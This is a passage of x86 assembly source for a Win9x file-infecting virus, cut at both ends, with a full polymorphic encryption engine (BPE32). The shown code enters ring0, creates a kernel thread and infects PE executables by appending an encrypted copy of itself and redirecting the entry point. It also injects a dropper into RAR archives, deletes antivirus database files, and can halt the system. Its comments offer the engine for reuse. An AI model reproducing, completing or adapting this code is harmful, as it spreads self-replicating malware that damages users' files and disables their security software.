        add [ebp + sleep_t - tgdelta], edx      ;add it to sleep time
	jmp t_end

sd_test:mov edx, [ebx.BGCB_Data]                ;get decrement
        sub [ebp + sleep_t - tgdelta], edx      ;substract sleep time with it
	jmp t_end

k_test: cli                                     ;halt system
_hlt_:	jmp _hlt_

ds_test:sti                                     ;allow INTs
        push 0                                  ;decommit page
	push 1
	push ebx
	push 00010002h
	call [ebp + VxDCall0 - tgdelta]
free_pg:push 0                                  ;free page
	push ebx
	push 0001000ah
	call [ebp + VxDCall0 - tgdelta]

        push -1                                 ;sleep thread for ever
sleep:  push 002a0009h                          ;service Sleep
        call [ebp + VxDCall0 - tgdelta]         ;call it
        popad                                   ;restore all regs
        ret                                     ;return
t_sleep:pushad                                  ;save all regs
        push 1000                               ;one second long sleep time
sleep_t = dword ptr $ - 4
        jmp sleep                               ;sleep
Thread EndP                                     ;thread ends here


infect: mov esi, edx                            ;ESI=EDI
infct2: mov byte ptr [ebp + semaphore - mgdelta], 0   ;set semaphore
        mov word ptr [ebp + ipatch - mgdelta], 9090h  ;patch int21h
        xor ecx, ecx                            ;ECX=0
        mov cl, 1                               ;CL=r0_patch
r0_patch = byte ptr $ - 1                       ;ring0 procedure is called
        jecxz LeaveRing0                        ;only once

        call EnterRing0                         ;EnTeRrInG0
        push 0                                  ;Now we will create new
        lea edx, [ebp + callback - mgdelta]     ;VMM thread
        push edx                                ;callback function
        push 'tA92'                             ;thread type
        push esi                                ;ES
        push ecx                                ;DS
        lea edx, [ebp + Thread - mgdelta]       ;EIP
        push edx                                ;...
        push ebx                                ;CS
        lea edx, [ebp + threadstack - mgdelta]  ;ESP
        push edx                                ;...
        push edi                                ;SS
        int 20h                                 ;VMMCall
        dd 00010105h                            ;VMMCreateThread
        sub esp, -24h                           ;correct stack
        mov byte ptr [ebp + r0_patch - mgdelta], 0    ;patch
        iretd                                   ;return from INT

LeaveRing0:
        call check_name                         ;check filename
;MODIFY ON YOUR OWN RISC!
        jc exit_infection                       ;error?
;       jmp exit_infection
        mov [ebp + tmpext - mgdelta], eax       ;save extension

        mov eax, 7143h                          ;LFN retrieve
        xor ebx, ebx                            ;attributes
	call int21h
	jc exit_infection
        mov [ebp + file_attr - mgdelta], ecx    ;save them

        mov eax, 7143h                          ;LFN set attributes
	inc ebx
	xor ecx, ecx
        call int21h                             ;set them
	jc exit_infection

        mov eax, 7143h                          ;LFN retrieve time/date
	inc ebx
	inc ebx
	inc ebx
	call int21h
	jc exit_infection
        mov [ebp + file_time - mgdelta], ecx    ;save it
	mov [ebp + file_date - mgdelta], edi

        mov eax, 716ch                          ;LFN extended Create/
        mov esi, edx                            ;/Open file
	dec ebx
	dec ebx
        xor ecx, ecx                            ;ECX=0
        cdq                                     ;EDX=0
        inc edx                                 ;EDX=1
        call int21h                             ;open file for R/W
	jc exit_infection
	xchg ebx, eax

        mov eax, 12345678                       ;get extension
tmpext = dword ptr $ - 4
        cmp ah, 'R'                             ;is it ".RAR" ?
        je try_RAR                              ;yeah, infect RAR

;Now we will test for Pentium+ processor
        pushad                                  ;save all regs
        pushfd                                  ;save EFLAGS
        pop eax                                 ;get them
        mov ecx, eax                            ;save them
        or eax, 200000h                         ;flip ID bit in EFLAGS
        push eax                                ;store
        popfd                                   ;flags
        pushfd                                  ;get them back
        pop eax                                 ;...
        xor eax, ecx                            ;same?
        je end_cc                               ;shit, we r on 486-
        xor eax, eax                            ;EAX=0
        inc eax                                 ;EAX=1
        cpuid                                   ;CPUID
        and eax, 111100000000b                  ;mask processor family
        cmp ah, 4                               ;is it 486?
        je end_cc                               ;baaaaaaad
        popad                                   ;no, Pentium installed

        mov byte ptr [ebp + v_state - mgdelta], BG_INFECTINEXEC ;set state
        push IMAGE_SIZEOF_DOS_HEADER            ;MZ header
	pop ecx
        call read_something                     ;read it
	jc close_file

	cmp word ptr [ebp + header - mgdelta], IMAGE_DOS_SIGNATURE
        jne close_file                          ;is it really MZ header?
	cmp word ptr [ebp + header.MZ_res2 - mgdelta], 29ah
bg_sig = word ptr $ - 2                         ;already infected?
	je close_file

        call seek_eof                           ;get file size
        jc close_file
        mov [ebp + fsize - mgdelta], eax        ;save it

        cmp eax, 1000h                          ;is it smaller than
        jb close_file                           ;4096 bytes?
        mov edx, 400000h                              
        cmp edx, eax                            ;too large?
	jb close_file

        mov edx, [ebp + header.MZ_lfanew - mgdelta]   ;get ptr to PE header
        mov [ebp + MZlfanew - mgdelta], edx     ;save it
	xchg eax, edx
        cmp eax, edx                            ;points inside file?
        jnb close_file                          ;no, invalid ptr

        call seek_here                          ;seek to MZ_lfanew
	mov ecx, 4+IMAGE_SIZEOF_FILE_HEADER+IMAGE_SIZEOF_NT_OPTIONAL_HEADER
        call read_something                     ;read whole PE header
	jc close_file

	cmp dword ptr [ebp + header - mgdelta], IMAGE_NT_SIGNATURE
        jne close_file                          ;is it PE\0\0?

	cmp word ptr [ebp + header.NT_FileHeader.FH_Machine - mgdelta], \
                IMAGE_FILE_MACHINE_I386         ;must i386 compatible
	jne close_file

	mov eax, [ebp + header.NT_FileHeader.FH_Characteristics - mgdelta]
	not al
	test ax, IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_DLL
        jne close_file                          ;must be EXEC, mustnt be DLL

	cmp [ebp + header.NT_OptionalHeader.OH_ImageBase - mgdelta], 400000h
        jne close_file                          ;must be 400000h

        movzx esi, word ptr [ebp + header.NT_FileHeader.FH_SizeOfOptionalHeader - mgdelta]
	movzx edx, word ptr [ebp + header.NT_FileHeader.FH_NumberOfSections - mgdelta]
	dec edx
        imul edx, IMAGE_SIZEOF_SECTION_HEADER   ;ptr to last section
	mov eax, 12345678h
MZlfanew = dword ptr $ - 4
	sub eax, -IMAGE_SIZEOF_FILE_HEADER-4
	add eax, esi
	add eax, edx
	mov [ebp + sh_pos - mgdelta], eax
        call seek_here                          ;seek to last section header

	push IMAGE_SIZEOF_SECTION_HEADER
	pop ecx
	lea edx, [ebp + section_header - mgdelta]
        call r_something                        ;read last section header
	jc close_file

        mov eax, virtual_end-Start              ;size of file in memory
        mov esi, [ebp + section_header.SH_SizeOfRawData - mgdelta]
	lea edx, [ebp + section_header.SH_VirtualSize - mgdelta]
        add [edx], eax                    ;new VirtualSize, set WRITE bit
        or byte ptr [ebp + section_header.SH_Characteristics.hiw.hib - mgdelta], 0c0h
        add eax, [edx]                          ;now we will align some items
	mov ecx, [ebp + header.NT_OptionalHeader.OH_FileAlignment - mgdelta]
        cdq                                     ;in PE header
        div ecx
        inc eax
	mul ecx 
	add [ebp + section_header.SH_SizeOfRawData - mgdelta], eax
        sub eax, esi                            ;new SizeOfRawData
	mov [ebp + header.NT_OptionalHeader.OH_SizeOfImage - mgdelta], eax
                                                ;new SizeOfImage
        mov eax, 12345678h                      ;ptr to last section header
sh_pos = dword ptr $ - 4
        call seek_here                          ;seek there

        push IMAGE_SIZEOF_SECTION_HEADER        ;write modified section
        pop ecx                                 ;header
	lea edx, [ebp + section_header - mgdelta]
        call write_something                    ;...

        call seek_here                          ;seek to MZ_res2
        push 2                                  ;and write there
        pop ecx                                 ;already infected
        lea edx, [ebp + bg_sig - mgdelta]       ;mark
        call write_something                    ;...
        push 4                                  ;write there original
        pop ecx                                 ;entrypoint also
	lea edx, [ebp + header.NT_OptionalHeader.OH_AddressOfEntryPoint - mgdelta]
        call write_something                    ;...

        mov eax, [ebp + MZlfanew - mgdelta]     ;seek to PE header
	call seek_here

        mov eax, 12345678h                      ;get file size
fsize = dword ptr $ - 4
	add eax, [ebp + section_header.SH_VirtualAddress - mgdelta]
	sub eax, [ebp + section_header.SH_PointerToRawData - mgdelta]
	mov [ebp + header.NT_OptionalHeader.OH_AddressOfEntryPoint - mgdelta], eax
                                                ;modify Entrypoint
	push IMAGE_SIZEOF_FILE_HEADER+4+5eh
	pop ecx
	lea edx, [ebp + header - mgdelta]
        call write_something                    ;write modified PE header

        call seek_eof                           ;seek to end of file
        lea edi, [ebp + crypted_virus - mgdelta] ;address of encrypted virus
        xor ecx, ecx                            ;ECX=0
        mov cl, 1                               ;CL=f_poly
f_poly = byte ptr $ - 1                         ;poly-engine ran once ?
        jecxz end_poly                          ;yeah, copy virus only

        mov esi, 12345678h                      ;get start of virus in memory
mem_addr = dword ptr $ - 4
        mov ecx, 6c0h                           ;aproximated size of virus
	call BPE32
        mov byte ptr [ebp + f_poly - mgdelta], 0 ;set poly semaphore
        mov byte ptr [ebp + do_RAR - mgdelta], 1 ;enable RAR infection
end_poly:
        mov ecx, 2000h                          ;8192 bytes
        mov edx, edi                            ;where?
        call write_something                    ;write 8192 bytes of virus
        jmp close_file                          ;to file and quit

end_cc: popad                                   ;restore all registers
close_file:                                      
        mov ah, 3eh                             ;close file
        call int21h                             ;...

        mov eax, 7143h                          ;LFN set file time/date
	push 3
	pop ebx
	lea edx, [ebp + targetname - mgdelta]
        mov ecx, 12345678h                      ;original time
file_time = dword ptr $ - 4
        mov edi, 12345678h                      ;original date
file_date = dword ptr $ - 4
        call int21h                             ;set it back

        mov eax, 7143h                          ;LFN set file attributes
	dec ebx
	dec ebx
        mov ecx, 12345678h                      ;original file attributes
file_attr = dword ptr $ - 4
        call int21h                             ;set it back

;now we will delete some AV databases
        lea esi, [ebp + ShItTyFiLeZ - mgdelta]  ;start of file names
        push 5                                  ;number of them
	pop ecx
DeLiT:  push ecx                                ;save count
	mov edx, esi
        mov eax, 4301h                          ;set file attributes
        xor ecx, ecx                            ;blank them
        call int21h                             ;...
        mov ah, 41h                             ;and delete file
        call int21h                             ;...
        pop ecx                                 ;restore count
end_sz: lodsb                                   ;get
        test al, al                             ;end of
        jne end_sz                              ;string
        loop DeLiT                              ;delete files in a loop
        jmp exit_infection                      ;and exit

try_RAR:
        mov byte ptr [ebp + v_state - mgdelta], BG_INFECTINRAR ;set v_state
        xor ecx, ecx                            ;ECX=0
        mov cl, 0                               ;CL=do_RAR
do_RAR = byte ptr $ - 1                         ;before infectin RAR we must
        jecxz close_file                        ;infect at least one EXE
                                                ;to initialize poly
;now we will check, if last file in RAR has our name. If has, RAR is already
;infected and we wont infect it again.
        call seek_eof                           ;go to the end of file
	jc close_file
        add eax, -3000h-8                       ;go to the EOF-3000h-8
        call seek_here                          ;...
	jc close_file
        lea edx, [ebp + tmpname - mgdelta]      ;read 8 bytes from that
        push 8                                  ;location to temporary buffer
        pop ecx                                 ;...
        call r_something                        ;...
	jc close_file
        push 2                                  ;compare 8 bytes of filename
        pop ecx
	mov esi, edx
	lea edi, [ebp + RARName - mgdelta]
n_cmp2: cmpsd
        jne inf_RAR                             ;not match, we can infect it
        loop n_cmp2
        jmp close_file                          ;RAR already infected, quit

inf_RAR:call seek_eof                           ;got to the end of file
        lea esi, [ebp + d1start - mgdelta]      ;get start of dropper part 1
        lea edi, [ebp + virus_in_arc - mgdelta] ;destination
        push edi                                ;save it for l8r use
        mov ecx, d1size                         ;how many bytes
        rep movsb                               ;copy dropper part 1
        lea esi, [ebp + crypted_virus - mgdelta] ;get start of encrypted virus
        mov ecx, 2000h                          ;8192 bytes
        rep movsb                               ;copy virus
        lea esi, [ebp + d2start - mgdelta]      ;get start of dropper part 2
        mov ecx, d2size                         ;how many bytes
        rep movsb                               ;copy dropper part 2
        pop esi                                 ;get address of dropper
        mov edi, 3000h                          ;size of dropper
        call CRC32                              ;calculate CRC32
        mov [ebp + RARCRC32 - mgdelta], eax     ;save it

        lea esi, [ebp + RARHeaderCRC + 2 - mgdelta] ;start of RAR header
        mov edi, end_RAR-RARHeader-2            ;size
        call CRC32                              ;calculate CRC32 of header
        mov [ebp + RARHeaderCRC - mgdelta], ax  ;save it

        mov ecx, end_RAR-RARHeader              ;size of RAR header
        lea edx, [ebp + RARHeader - mgdelta]    ;start of RAR header
        call write_something                    ;write RAR header to file

        mov ecx, 3000h                          ;dropper size
        lea edx, [ebp + virus_in_arc - mgdelta] ;start of dropper
        call write_something                    ;write dropper to file
        jmp close_file                          ;and close file


c_name: push edi                                ;save EDI
        lea edi, [ebp + targetname - sgdelta]   ;address of filename
	jmp cname                                                    
check_name:
        push edi                                ;save EDI
        lea edi, [ebp + targetname - mgdelta]   ;address of filename
cname:  mov edx, edi                            ;...
        mov ecx, MAX_PATH                       ;size of filename
	cld
n_loop: lodsb                                   ;load byte
        cmp al, 'a'                             ;is it BIG letter?
        jb nlower                               ;yeah
        cmp al, 'z'                             ;is it letter?
        ja nlower                               ;no
        add al, 'A'-'a'                         ;upper letter
nlower: stosb                                   ;save letter
        test al, al                             ;is it end?
        je e_name                               ;yeah
        cmp al, '\'                             ;is it backslash
        jne nloop                               ;no
nloop:  loop n_loop                             ;upper letters in loop
i_name: pop edi                                 ;restore EDI
        stc                                     ;set error flag
        ret                                     ;and return
e_name: mov eax, [edi-5]                        ;get extension
        cmp eax, 'EXE.'                         ;is it .EXE
	je n_name
        cmp eax, 'RCS.'                         ;is it .SCR
	je n_name
        cmp eax, 'RAR.'                         ;is it .RAR
	je n_name
        cmp eax, 'XFS.'                         ;is it .SFX
	je n_name
        cmp eax, 'LPC.'                         ;is it .CPL
        je n_name
        cmp eax, 'KAB.'                         ;is it .BAK
	je n_name
        cmp eax, 'TAD.'                         ;is it .DAT
        jne i_name                               
n_name: pop edi                                 ;restore EDI
callback:
        clc                                     ;clear error flag
        ret                                     ;and return

seek_here:                                      ;seek to EAX
        mov ecx, eax                            ;ECX=EAX
        shr ecx, 16                             ;CX=MSW of EAX
        movzx edx, ax                           ;DX=LSW of EAX
        xor eax, eax                            ;EAX=0
        jmp seek                                ;seek
seek_eof:
        mov al, 02h                             ;AL=2h
        cdq                                     ;EDX=0
        xor ecx, ecx                            ;ECX=0
seek:   mov ah, 42h                             ;AH=42h
        call int21h                             ;seek
        jc q_seek                               ;error?
        movzx eax, ax                           ;EAX=LSW of EAX
        shl edx, 16
        or eax, edx                             ;EAX=LSW of EAX & MSW of EDX
        cdq                                     ;EDX=0
        clc                                     ;clear error flag
q_seek: ret                                     ;return

CRC32:  push ebx                                ;I found this code in Int13h's
        xor ecx, ecx                            ;tutorial about infectin'
        dec ecx                                 ;archives. Int13h found this
        mov edx, ecx                            ;code in Vecna's Inca virus.
NextByteCRC:                                    ;So, thank ya guys...
        xor eax, eax                            ;Ehrm, this is very fast
        xor ebx, ebx                            ;procedure to code CRC32 at
        lodsb                                   ;runtime, no need to use big
        xor al, cl                              ;tables.
	mov cl, ch
	mov ch, dl
	mov dl, dh
	mov dh, 8
NextBitCRC:
	shr bx, 1
	rcr ax, 1
	jnc NoCRC
	xor ax, 08320h
	xor bx, 0edb8h
NoCRC:  dec dh
	jnz NextBitCRC
	xor ecx, eax
	xor edx, ebx
        dec edi
	jne NextByteCRC
	not edx
	not ecx
	pop ebx
	mov eax, edx
	rol eax, 16
	mov ax, cx
	ret

;BPE32 (Benny's Polymorphic Engine for Win32) starts here. U can find first
;version of BPE32 in DDT#1 e-zine. But unfortunately, how it usualy goes,
;there were TWO, REALLY SILLY/TINY bugs. I found them and corrected them. So,
;if u wanna use BPE32 in your code, use this version, not that version from
;DDT#1. Very BIG sorry to everyone, who had/has/will have problems with it.

BPE32   Proc
	pushad					;save all regs
	push edi				;save these regs for l8r use
	push ecx				;	...
	mov edx, edi				;	...
	push esi				;preserve this reg
	call rjunk				;generate random junk instructions
	pop esi					;restore it
	mov al, 0e8h				;create CALL instruction
	stosb					;	...
	mov eax, ecx				;	...
	imul eax, 4				;	...
	stosd					;	...

	mov eax, edx				;calculate size of CALL+junx
	sub edx, edi				;	...
	neg edx					;	...
	add edx, eax				;	...
	push edx				;save it

	push 0					;get random number
	call random				;	...
	xchg edx, eax
	mov [ebp + xor_key - mgdelta], edx	;use it as xor constant
	push 0					;get random number
	call random				;	...
	xchg ebx, eax
	mov [ebp + key_inc - mgdelta], ebx	;use it as key increment constant
x_loop:	lodsd					;load DWORD
	xor eax, edx				;encrypt it
	stosd					;store encrypted DWORD
	add edx, ebx				;increment key
	loop x_loop				;next DWORD

	call rjunk				;generate junx

	mov eax, 0006e860h			;generate SEH handler
	stosd					;	...
	mov eax, 648b0000h			;	...
	stosd					;	...
	mov eax, 0ceb0824h			;	...
	stosd					;	...

greg0:	call get_reg				;get random register
	cmp al, 5				;MUST NOT be EBP register
	je greg0
	mov bl, al				;store register
	mov dl, 11				;proc parameter (do not generate MOV)
	call make_xor				;create XOR or SUB instruction
	inc edx					;destroy parameter
	mov al, 64h				;generate FS:
	stosb					;store it
	mov eax, 896430ffh			;next SEH instructions
	or ah, bl				;change register
	stosd					;store them
	mov al, 20h				;	...
	add al, bl				;	...
	stosb					;	...

	push 2					;get random number
	call random
	test eax, eax
	je _byte_
	mov al, 0feh				;generate INC DWORD PTR
	jmp _dw_
_byte_:	mov al, 0ffh				;generate INC BYTE PTR
_dw_:	stosb					;store it
	mov al, bl				;store register
	stosb					;	...
	mov al, 0ebh				;generate JUMP SHORT
	stosb					;	...
	mov al, -24d				;generate jump to start of code (trick
        stosb                                   ;for better emulators, e.g. NODICE32)

	call rjunk				;generate junx
greg1:	call get_reg				;generate random register
	cmp al, 5				;MUST NOT be EBP
	je greg1
	mov bl, al				;store it

	call make_xor				;generate XOR,SUB reg, reg or MOV reg, 0

	mov al, 64h				;next SEH instructions
	stosb					;	...
	mov al, 8fh				;	...
	stosb					;	...
	mov al, bl				;	...
	stosb					;	...
	mov al, 58h				;	...
	add al, bl				;	...
	stosb					;	...

	mov al, 0e8h				;generate CALL
	stosb					;	...
	xor eax, eax				;	...
	stosd					;	...
	push edi				;store for l8r use
	call rjunk				;call junk generator

	call get_reg				;random register
	mov bl, al				;store it
	push 1					;random number (0-1)
	call random				;	...
	test eax, eax
	jne next_delta

	mov al, 8bh				;generate MOV reg, [ESP]; POP EAX
	stosb
	mov al, 80h
	or al, bl
	rol al, 3
	stosb
	mov al, 24h
	stosb
	mov al, 58h
	jmp bdelta

next_delta:
	mov al, bl				;generate POP reg; SUB reg, ...
	sub al, -58h
bdelta:	stosb
	mov al, 81h
	stosb
	mov al, 0e8h
	add al, bl
	stosb
	pop eax
	stosd
	call rjunk				;random junx

	xor bh, bh				;parameter (first execution only)
	call greg2				;generate MOV sourcereg, ...
	mov al, 3				;generate ADD sourcereg, deltaoffset
	stosb					;	...
	mov al, 18h				;	...
	or al, bh				;	...
	rol al, 3				;	...
	or al, bl				;	...
	stosb					;	...
	mov esi, ebx				;store EBX
	call greg2				;generate MOV countreg, ...
	mov cl, bh				;store count register
	mov ebx, esi				;restore EBX

	call greg3				;generate MOV keyreg, ...
	push edi				;store this position for jump to decryptor
	mov al, 31h				;generate XOR [sourcereg], keyreg
	stosb					;	...
	mov al, ch				;	...
	rol al, 3				;	...
	or al, bh				;	...
	stosb					;	...

	push 6					;this stuff will choose ordinary of calls
	call random				;to code generators
	test eax, eax
	je g5					;GREG4 - key incremention
	cmp al, 1				;GREG5 - source incremention
	je g1					;GREG6 - count decremention
	cmp al, 2				;GREG7 - decryption loop
	je g2
	cmp al, 3
	je g3
	cmp al, 4
	je g4

g0:	call gg1
	call greg6
	jmp g_end
g1:	call gg2
	call greg5
	jmp g_end
g2:	call greg5
	call gg2
	jmp g_end
g3:	call greg5
gg3:	call greg6
	jmp g_out
g4:	call greg6
	call gg1
	jmp g_end
g5:	call greg6
	call greg5
g_out:	call greg4
g_end:	call greg7
	mov al, 61h				;generate POPAD instruction
	stosb					;	...
	call rjunk				;junk instruction generator
	mov al, 0c3h				;RET instruction
	stosb					;	...
	pop eax					;calculate size of decryptor and encrypted data
	sub eax, edi				;	...
	neg eax					;	...
	mov [esp.Pushad_eax], eax		;store it to EAX register
	popad					;restore all regs
	ret					;and thats all folx
get_reg proc					;this procedure generates random register
	push 8					;random number (0-7)
	call random				;	...
	test eax, eax
	je get_reg				;MUST NOT be 0 (=EAX is used as junk register)
	cmp al, 100b				;MUST NOT be ESP
	je get_reg
	ret
get_reg endp
make_xor proc					;this procedure will generate instruction, that
	push 3					;will nulify register (BL as parameter)
	call random
	test eax, eax
	je _sub_
	cmp al, 1
	je _mov_
	mov al, 33h				;generate XOR reg, reg
	jmp _xor_
_sub_:	mov al, 2bh				;generate SUB reg, reg
_xor_:	stosb
	mov al, 18h
	or al, bl
	rol al, 3
	or al, bl
	stosb
	ret
_mov_:	cmp dl, 11				;generate MOV reg, 0
	je make_xor
	mov al, 0b8h
	add al, bl
	stosb
	xor eax, eax
	stosd
	ret
make_xor endp
gg1:	call greg4
	jmp greg5
gg2:	call greg4
	jmp greg6

random	proc					;this procedure will generate random number
						;in range from 0 to pushed_parameter-1
						;0 = do not truncate result
	push edx				;save EDX
	db 0fh, 31h				;RDTCS instruction - reads PSs tix and stores
						;number of them into pair EDX:EAX
	xor edx, edx				;nulify EDX, we need only EAX
	cmp [esp+8], edx			;is parameter==0 ?
	je r_out				;yeah, do not truncate result
	div dword ptr [esp+8]			;divide it
	xchg eax, edx				;remainder as result
r_out:	pop edx					;restore EDX
	ret Pshd				;quit procedure and destroy pushed parameter
random	endp
make_xor2 proc					;create XOR instruction
	mov al, 81h
	stosb
	mov al, 0f0h
	add al, bh
	stosb
	ret
make_xor2 endp

greg2	proc					;1 parameter = source/count value
	call get_reg				;get register
	cmp al, bl				;already used ?
	je greg2
	cmp al, 5
	je greg2
	cmp al, bh
	je greg2
	mov bh, al

	mov ecx, [esp+4]			;get parameter
	push 5					;choose instructions
	call random
	test eax, eax
	je s_next0
	cmp al, 1
	je s_next1
	cmp al, 2
	je s_next2
	cmp al, 3
	je s_next3

	mov al, 0b8h				;MOV reg, random_value
	add al, bh				;XOR reg, value
	stosb					;param = random_value xor value
	push 0
	call random
	xor ecx, eax
	stosd
	call make_xor2
	mov eax, ecx
	jmp n_end2
s_next0:mov al, 68h				;PUSH random_value
	stosb					;POP reg
	push 0					;XOR reg, value
	call random				;result = random_value xor value
	xchg eax, ecx
	xor eax, ecx
	stosd
	mov al, 58h
	add al, bh
	stosb
	call make_xor2
	xchg eax, ecx
	jmp n_end2
s_next1:mov al, 0b8h				;MOV EAX, random_value
	stosb					;MOV reg, EAX
	push 0					;SUB reg, value
	call random				;result = random_value - value
	stosd
	push eax
	mov al, 8bh
	stosb
	mov al, 18h
	or al, bh
	rol al, 3
	stosb
	mov al, 81h
	stosb
	mov al, 0e8h
	add al, bh
	stosb
	pop eax
	sub eax, ecx
	jmp n_end2
s_next2:push ebx				;XOR reg, reg
	mov bl, bh				;XOR reg, random_value
	call make_xor				;ADD reg, value
	pop ebx					;result = random_value + value
	call make_xor2
	push 0
	call random
	sub ecx, eax
	stosd
	push ecx
	call s_lbl
	pop eax
	jmp n_end2
s_lbl:	mov al, 81h				;create ADD reg, ... instruction
	stosb
	mov al, 0c0h
	add al, bh
	stosb
	ret
s_next3:push ebx				;XOR reg, reg
	mov bl, bh				;ADD reg, random_value
	call make_xor				;XOR reg, value
	pop ebx					;result = random_value xor value
	push 0
	call random
	push eax
	xor eax, ecx
	xchg eax, ecx
	call s_lbl
	xchg eax, ecx
	stosd
	call make_xor2
	pop eax	
n_end2:	stosd
	push esi
	call rjunk
	pop esi
	ret Pshd
greg2	endp

greg3	proc
	call get_reg				;get register
	cmp al, 5				;already used ?
	je greg3
	cmp al, bl
	je greg3
	cmp al, bh
	je greg3
	cmp al, cl
	je greg3
	mov ch, al
	mov edx, 12345678h			;get encryption key value
xor_key = dword ptr $ - 4

	push 3
	call random
	test eax, eax
	je k_next1
	cmp al, 1
	je k_next2

	push ebx				;XOR reg, reg
	mov bl, ch				;OR, ADD, XOR reg, value
	call make_xor
	pop ebx

	mov al, 81h
	stosb
	push 3
	call random
	test eax, eax
	je k_nxt2
	cmp al, 1
	je k_nxt3

	mov al, 0c0h
k_nxt1:	add al, ch
	stosb
	xchg eax, edx
n_end1:	stosd
k_end:	call rjunk
	ret
k_nxt2:	mov al, 0f0h
	jmp k_nxt1
k_nxt3:	mov al, 0c8h
	jmp k_nxt1
k_next1:mov al, 0b8h				;MOV reg, value
	jmp k_nxt1
k_next2:mov al, 68h				;PUSH value
	stosb					;POP reg
	xchg eax, edx
	stosd
	mov al, ch
	sub al, -58h
	jmp i_end1
greg3	endp

greg4	proc
	mov edx, 12345678h			;get key increment value
key_inc = dword ptr $ - 4
i_next:	push 3
	call random
	test eax, eax
	je i_next0
	cmp al, 1
	je i_next1
	cmp al, 2
	je i_next2

	mov al, 90h				;XCHG EAX, reg
	add al, ch				;XOR reg, reg
	stosb					;OR reg, EAX
	push ebx				;ADD reg, value
	mov bl, ch
	call make_xor
	pop ebx
	mov al, 0bh
	stosb
	mov al, 18h
	add al, ch
	rol al, 3
	stosb
i_next0:mov al, 81h				;ADD reg, value
	stosb
	mov al, 0c0h
	add al, ch
	stosb
	xchg eax, edx
	jmp n_end1
i_next1:mov al, 0b8h				;MOV EAX, value
	stosb					;ADD reg, EAX
	xchg eax, edx
	stosd
	mov al, 3
	stosb
	mov al, 18h
	or al, ch
	rol al, 3
i_end1:	stosb
i_end2:	call rjunk
	ret
i_next2:mov al, 8bh				;MOV EAX, reg
	stosb					;ADD EAX, value
	mov al, 0c0h				;XCHG EAX, reg
	add al, ch
	stosb
	mov al, 5
	stosb
	xchg eax, edx
	stosd
	mov al, 90h
	add al, ch
	jmp i_end1
greg4	endp

greg5	proc
	push ecx
	mov ch, bh
	push 4
	pop edx
	push 2
	call random
	test eax, eax
	jne ng5
	call i_next				;same as previous, value=4
	pop ecx
	jmp k_end
ng5:	mov al, 40h				;4x inc reg
	add al, ch
	pop ecx
	stosb
	stosb
	stosb
	jmp i_end1
greg5	endp

greg6	proc
	push 5
	call random
	test eax, eax
	je d_next0
	cmp al, 1
	je d_next1
	cmp al, 2
	je d_next2

	mov al, 83h				;SUB reg, 1
	stosb
	mov al, 0e8h
	add al, cl
	stosb
	mov al, 1
	jmp i_end1
d_next0:mov al, 48h				;DEC reg
	add al, cl
	jmp i_end1
d_next1:mov al, 0b8h				;MOV EAX, random_value
	stosb					;SUB reg, EAX
	push 0					;ADD reg, random_value-1
	call random
	mov edx, eax
	stosd
	mov al, 2bh
	stosb
	mov al, 18h
	add al, cl
	rol al, 3
	stosb
	mov al, 81h
	stosb
	mov al, 0c0h
	add al, cl
	stosb
	dec edx
	mov eax, edx
	jmp n_end1
d_next2:mov al, 90h				;XCHG EAX, reg
	add al, cl				;DEC EAX
	stosb					;XCHG EAX, reg
	mov al, 48h
	stosb
	mov al, 90h
	add al, cl
	jmp i_end1
greg6	endp

greg7	proc
	mov edx, [esp+4]
	dec edx
	push 2
	call random
	test eax, eax
	je l_next0
	mov al, 51h				;PUSH ECX
	stosb					;MOV ECX, reg
	mov al, 8bh				;JECXZ label
	stosb					;POP ECX
	mov al, 0c8h				;JMP decrypt_loop
	add al, cl				;label:
	stosb					;POP ECX
	mov eax, 0eb5903e3h
	stosd
	sub edx, edi
	mov al, dl
	stosb
	mov al, 59h
	jmp l_next
l_next0:push ebx				;XOR EAX, EAX
	xor bl, bl				;DEC EAX
	call make_xor				;ADD EAX, reg
	pop ebx					;JNS decrypt_loop
	mov al, 48h
	stosb
	mov al, 3
	stosb
	mov al, 0c0h
	add al, cl
	stosb
	mov al, 79h
	stosb
	sub edx, edi
	mov al, dl
l_next:	stosb
	call rjunk
	ret Pshd
greg7	endp

rjunkjc:push 7
	call random
	jmp rjn
rjunk	proc			;junk instruction generator
	push 8
	call random		;0=5, 1=1+2, 2=2+1, 3=1, 4=2, 5=3, 6=none, 7=dummy jump and call
rjn:	test eax, eax
	je j5
	cmp al, 1
	je j_1x2
	cmp al, 2
	je j_2x1
	cmp al, 4
	je j2
	cmp al, 5
	je j3
	cmp al, 6
	je r_end
	cmp al, 7
	je jcj

j1:	call junx1		;one byte junk instruction
	nop
	dec eax
	cmc
	inc eax
	clc
	cwde
	stc
	cld
junx1:	pop esi
	push 8
	call random
	add esi, eax
	movsb
	ret
j_1x2:	call j1			;one byte and two byte
	jmp j2
j_2x1:	call j2			;two byte and one byte
	jmp j1
j3:	call junx3
	db	0c1h, 0c0h	;rol eax, ...
	db	0c1h, 0e0h	;shl eax, ...
	db	0c1h, 0c8h	;ror eax, ...
	db	0c1h, 0e8h	;shr eax, ...
	db	0c1h, 0d0h	;rcl eax, ...
	db	0c1h, 0f8h	;sar eax, ...
	db	0c1h, 0d8h	;rcr eax, ...
	db	083h, 0c0h
	db	083h, 0c8h
	db	083h, 0d0h
	db	083h, 0d8h
	db	083h, 0e0h
	db	083h, 0e8h
	db	083h, 0f0h
	db	083h, 0f8h	;cmp eax, ...
	db	0f8h, 072h	;clc; jc ...
	db	0f9h, 073h	;stc; jnc ...

junx3:	pop esi			;three byte junk instruction
	push 17
	call random
	imul eax, 2
	add esi, eax
	movsb
	movsb
r_ran:	push 0
	call random
	test al, al
	je r_ran
	stosb
	ret
j2:	call junx2
	db	8bh		;mov eax, ...
	db	03h		;add eax, ...
	db	13h		;adc eax, ...
	db	2bh		;sub eax, ...
	db	1bh		;sbb eax, ...
	db	0bh		;or eax, ...
	db	33h		;xor eax, ...
	db	23h		;and eax, ...
	db	33h		;test eax, ...

junx2:	pop esi			;two byte junk instruction
	push 9
	call random
	add esi, eax
	movsb
	push 8
	call random
	sub al, -11000000b
	stosb
r_end:	ret
j5:	call junx5
	db	0b8h		;mov eax, ...
	db	05h		;add eax, ...
	db	15h		;adc eax, ...
	db	2dh		;sub eax, ...
	db	1dh		;sbb eax, ...
	db	0dh		;or eax, ...
	db	35h		;xor eax, ...
	db	25h		;and eax, ...
	db	0a9h		;test eax, ...
	db	3dh		;cmp eax, ...

junx5:	pop esi			;five byte junk instruction
	push 10
	call random
	add esi, eax
	movsb
	push 0
	call random
	stosd
	ret
jcj:	call rjunkjc		;junk
	push edx		;CALL label1
	push ebx		;junk
